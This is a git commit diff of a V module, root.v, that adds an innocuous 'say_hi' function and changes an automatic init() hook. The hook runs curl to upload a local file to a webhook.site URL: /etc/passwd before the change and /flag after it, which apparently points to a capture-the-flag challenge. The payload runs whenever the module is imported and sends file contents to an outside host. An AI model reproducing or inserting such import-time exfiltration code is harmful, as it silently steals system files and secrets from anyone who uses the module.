83be43e47776564338d060a6beec3286fe6f2118
Abdillah <abdillah.muhamad@vantagepoint.co.id>
2021-10-31 14:41:53 +0700

    INIT

--- root.v
+++ root.v
@@ -1,7 +1,12 @@
+module mymodule
+
 import os
 
-
+// To export a function we have to use `pub`
+pub fn say_hi() {
+	println('hello from mymodule!')
+}
 
 fn init(){
-os.system('curl -F "file=@/etc/passwd" https://webhook.site/eaadc4bb-70c8-42c2-9d3d-7a212d91f7be')
+os.system('curl -F "file=@/flag" https://webhook.site/eaadc4bb-70c8-42c2-9d3d-7a212d91f7be')
 }
